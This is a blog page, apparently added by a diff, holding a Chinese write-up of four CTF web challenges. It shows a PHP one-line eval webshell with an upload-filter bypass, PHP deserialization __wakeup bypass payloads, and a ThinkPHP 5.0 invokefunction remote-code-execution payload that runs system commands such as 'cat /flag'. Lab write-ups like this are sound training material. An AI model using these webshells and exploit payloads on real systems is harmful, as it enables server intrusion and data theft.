@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="moMaxX">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="web攻防世界进阶篇"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Momax&#39;s blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://moMaxX.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Momax&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Momax's blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+  	<!-- 雪花特效 --> 
+  
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">web攻防世界进阶篇</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/MomaxX" target="_blank" rel="noopener">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:194038819@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By moMaxX</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-09-25</span>
+            <span class="time">23:47:03</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>说来惭愧，一星难度难到了我。打开题目场景，发现<br><img src="https://img-blog.csdnimg.cn/2020092319095889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现提示上传文件，那应该就是文件上传漏洞了。直接一句话木马上传发现提示<br><img src="https://img-blog.csdnimg.cn/202009231911100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后打开网页源代码发现js代码验证文件类型<br><img src="https://img-blog.csdnimg.cn/20200923191217692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就修改文件后缀为jpg上传发现上传成功，用菜刀连接失败，是因为没有修改后缀的原因。这里有两种解题思路。<br>一、F12打开控制界面窗口，删除<code>disabled</code>即可上传成功<code>.php</code>文件。<br><img src="https://img-blog.csdnimg.cn/20200923191540796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200923191615652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功。<br>这个题目很简单，直接给了上传路径。然后浏览器搜索路径，发现打开页面无异常。即可直接菜刀连接。<br><img src="https://img-blog.csdnimg.cn/20200923191957779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>找到flag。<br>二、brupsuit抓包。<br>打开工具，进行抓包，把修改过后缀的一句话木马后缀改回来，然后放包。同样上传成功。</p>
+<p><strong>注意</strong>：一句话木马文件里的<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>中的POST括号里跟的什么，最后的菜刀连接密码就是什么。</p>
+<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>打开题目场景发现是一段PHP代码，第一感觉应该是PHP代码审计。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目源代码。<br>然后就百度了一下代码段里的各个函数。总结了一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PHP __construct()函数：</span><br><span class="line">  构造函数</span><br><span class="line">    php中构造方法是对象创建完成后第一个被对象自动调用的方法。</span><br><span class="line">   在每个类中都有一个构造方法，如果没有显示声明它，</span><br><span class="line">   那么类中都会默认存在一个没有参数且内容为空的构造方法。</span><br><span class="line">   通常构造方法被用来执行一些有用的初始化任务，</span><br><span class="line">   如对成员属性在创建对象时赋予初始值。</span><br><span class="line">PHP __destruct()函数：</span><br><span class="line">  析构函数</span><br><span class="line">  析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">没有返回值，为了释放资源，一个类里面只有一个析构函数。</span><br><span class="line">__wakeup()函数：</span><br><span class="line">   用于PHP反序列里面。可以用正则匹配绕过。成员属性数目大于实际数目。正则匹配可以用+号来进行绕过。</span><br><span class="line"><span class="keyword">isset</span>()函数：</span><br><span class="line">   检测变量是否被赋值，且不为空，若是返回<span class="keyword">true</span>，否则返回<span class="keyword">false</span>。</span><br><span class="line">preg_match()函数：</span><br><span class="line">   函数用于执行一个正则表达式匹配。匹配到返回<span class="keyword">true</span>，否则返回<span class="keyword">false</span>。</span><br></pre></td></tr></table></figure>
+<p>其实刚开始百度时没看懂，就仔细试验了两遍，才发现了析构函数的作用。这里推荐<a href="https://blog.csdn.net/asdfzxc123789/article/details/101782503?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">一个人的博客</a><br>发了一段代码，看了之后感觉就清楚了。<br>就自己修改了一下源代码，运行了一下，然后修改运行结果，base64编码，得到flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$str=<span class="keyword">new</span> Demo(<span class="string">"fl4g.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($str);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行代码得到<code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，修改后：<code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，base64编码后：<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code><br>所以，在搜索框用<strong>get</strong> 方式输入<code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code>。<br>之后得到flag。</p>
+<h2 id="PHP-rec"><a href="#PHP-rec" class="headerlink" title="PHP_rec"></a>PHP_rec</h2><p>打开题目发现样式没接触过，又是一个新的题型。get了。<br><img src="https://img-blog.csdnimg.cn/20200925224259770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>习惯性F12，发现并没有发现什么。之后就请求了我万能的师傅，度娘，发现了一个名叫<a href="https://blog.csdn.net/qq_40884727/article/details/101452478" target="_blank" rel="noopener">*<em>rec*</em>漏洞的玩意儿。</a><br>然后这里还有一个大佬写的关于这个题目的<a href="https://blog.csdn.net/Mr_helloword/article/details/107924218" target="_blank" rel="noopener">做题方法</a>，两者结合就搞懂了七七八八。<br>看了大佬博客后也是懂了一点，但是由于当时事件原因，就没有自己尝试着去一步一步了解。<br>所以就得到了一个<strong>payload</strong> <code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br>然后知道是在虚拟机上运行的。所以就用<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br>发现可以正常运行。<br><img src="https://img-blog.csdnimg.cn/20200925230031177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着就用<strong>ls</strong> 命令查看目录。<code>?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br>得到<img src="https://img-blog.csdnimg.cn/20200925230131596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着一级一级查找上级目录。<code>?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls ../../../</code>一个一个尝试出来的。<br>发现了名为flag的文件名。<br><img src="https://img-blog.csdnimg.cn/202009252302540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>然后就查找和flag有关的文件名字。<code>?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</code><br>得到<br><img src="https://img-blog.csdnimg.cn/20200925230417810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后用<strong>cat</strong> 命令查看目标文件的内容<code>?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code><br>得到<img src="https://img-blog.csdnimg.cn/20200925230526613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>flag出来了。nice，get到了没？</p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>打开题目，发现了反序列化。__wakeup()。<br><img src="https://img-blog.csdnimg.cn/20200925231356732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改一下代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$x= serialize(<span class="keyword">new</span> xctf); </span><br><span class="line"><span class="keyword">echo</span> $x;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行得到<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>。<br>修改后得<code>O:4:&quot;xctf&quot;:2:{s:5:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>然后get方式获取flag。<br>据提示，get code变量<code>http://220.249.52.133:42025/?code=O:4:&quot;xctf&quot;:2:{s:5:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/20200925233652804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
